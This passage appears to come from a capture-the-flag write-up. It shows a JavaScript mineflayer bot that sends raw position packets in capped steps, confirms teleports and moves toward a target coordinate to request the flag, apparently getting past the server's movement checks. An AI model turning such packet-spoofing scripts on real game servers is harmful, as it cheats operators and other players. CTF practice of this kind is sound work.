</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">stepTowards</span> <span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">dst</span><span class="p">,</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dx</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">x</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dy</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dz</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">dx</span> <span class="o">*</span> <span class="nx">dx</span> <span class="o">+</span> <span class="nx">dy</span> <span class="o">*</span> <span class="nx">dy</span> <span class="o">+</span> <span class="nx">dz</span> <span class="o">*</span> <span class="nx">dz</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nx">cur</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">&lt;=</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">dst</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">maxStep</span> <span class="o">/</span> <span class="nx">dist</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">cur</span><span class="p">.</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">dx</span> <span class="o">*</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span> <span class="o">+</span> <span class="nx">dy</span> <span class="o">*</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">dz</span> <span class="o">*</span> <span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">version</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">parseArgs</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[INIT] Config:&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">version</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">createOpts</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">auth</span><span class="o">:</span> <span class="s1">&#39;offline&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">version</span> <span class="o">&amp;&amp;</span> <span class="nx">version</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">!==</span> <span class="s1">&#39;auto&#39;</span><span class="p">)</span> <span class="nx">createOpts</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="nx">version</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[INIT] Version: auto&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">bot</span> <span class="o">=</span> <span class="nx">mineflayer</span><span class="p">.</span><span class="nx">createBot</span><span class="p">(</span><span class="nx">createOpts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[STATE] Logged in, waiting for spawn...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;kicked&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[STATE] Kicked:&#39;</span><span class="p">,</span> <span class="nx">reason</span><span class="o">?</span><span class="p">.</span><span class="nx">toString</span><span class="o">?</span><span class="p">.()</span> <span class="o">||</span> <span class="nx">reason</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[STATE] Error:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[STATE] Disconnected&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">cm</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">cm</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[CHAT]&#39;</span><span class="p">,</span> <span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;ctf{&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bot</span><span class="p">.</span><span class="nx">end</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">movementStarted</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">movementState</span> <span class="o">=</span> <span class="kc">null</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">teleportReady</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">startMovement</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="nx">movementStarted</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">entity</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">clone</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[STATE] Starting movement (</span><span class="si">${</span><span class="nx">reason</span><span class="si">}</span><span class="sb">) at`</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">x</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span> <span class="o">&amp;&amp;</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span><span class="p">.</span><span class="nx">startFlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span><span class="p">.</span><span class="nx">startFlying</span><span class="p">();</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[ACTION] Start flying&#39;</span><span class="p">)</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">cur</span> <span class="o">=</span> <span class="nx">start</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">moving</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">stepCount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">interval</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">((</span><span class="nx">a</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">y</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Target:&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">z</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Initial distance:&#39;</span><span class="p">,</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;blocks&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">movementState</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">cur</span><span class="p">,</span> <span class="nx">moving</span><span class="p">,</span> <span class="nx">stepCount</span><span class="p">,</span> <span class="nx">interval</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">moving</span><span class="p">)</span> <span class="k">return</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">next</span> <span class="o">=</span> <span class="nx">stepTowards</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">,</span> <span class="nx">MAX_STEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">stepLen</span> <span class="o">=</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">remainBefore</span> <span class="o">=</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span> <span class="o">=</span> <span class="nx">next</span>
</span></span><span class="line"><span class="cl">      <span class="nx">movementState</span><span class="p">.</span><span class="nx">stepCount</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[MOVE] step </span><span class="si">${</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">stepCount</span><span class="si">}</span><span class="sb"> -&gt; (</span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">) `</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                  <span class="sb">`(step=</span><span class="si">${</span><span class="nx">stepLen</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb"> rem=</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">remainBefore</span> <span class="o">-</span> <span class="nx">stepLen</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">)`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;position&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">,</span> <span class="nx">onGround</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;position_look&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">,</span> <span class="nx">yaw</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">pitch</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">onGround</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[NET] Move send failed:&#39;</span><span class="p">,</span> <span class="nx">e2</span><span class="o">?</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="nx">e2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">next</span><span class="p">.</span><span class="nx">equals</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">movementState</span><span class="p">.</span><span class="nx">moving</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Arrived at target. Requesting flag...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[CHAT] &gt;&gt; !flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="s1">&#39;!flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="mi">500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="nx">interval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WARN] Spawn not seen after 5s; starting anyway...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;timeout&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">debugCount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;packet&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">meta</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">debugCount</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[PKT]&#39;</span><span class="p">,</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">debugCount</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;player_position_and_look&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;position&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;position_look&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;player_position&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hasTeleportId</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">hasTeleportId</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;teleport_confirm&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">teleportId</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[NET] Confirmed teleport id&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[NET] Teleport confirm write failed:&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="o">?</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">teleportReady</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hasXYZ</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">x</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">y</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">z</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">hasXYZ</span> <span class="o">&amp;&amp;</span> <span class="nx">movementState</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SYNC] Cur pos updated from server packet&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;server-position&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">().</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><blockquote>
